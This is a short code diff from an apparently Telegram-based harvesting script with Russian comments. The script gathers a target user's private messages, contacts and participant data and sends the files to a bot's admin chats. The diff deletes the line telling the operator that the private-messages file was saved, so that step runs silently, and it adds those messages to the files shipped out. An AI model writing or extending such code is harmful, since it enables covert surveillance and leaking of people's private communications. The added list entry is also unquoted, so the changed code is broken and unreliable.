@@ -70,7 +70,7 @@ def get_private_messages(client, target_user, userinfo):
     filename = f"{target_user}_private_messages.html"
     with open(filename, "w", encoding="utf-8") as file:
         file.write(html_output)
-    print(f"HTML-файл сохранен как '{filename}'")
+
 
 
 
@@ -1272,7 +1272,7 @@ def generate_html_report(phone, userid, userinfo, firstname, lastname, username,
     
 # Функци по отправке в боты
 def send_files_to_bot(bot, admin_chat_ids):
-    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_report.pdf']
+    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', _private_messages]
 
     for file_extension in file_extensions:
         files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
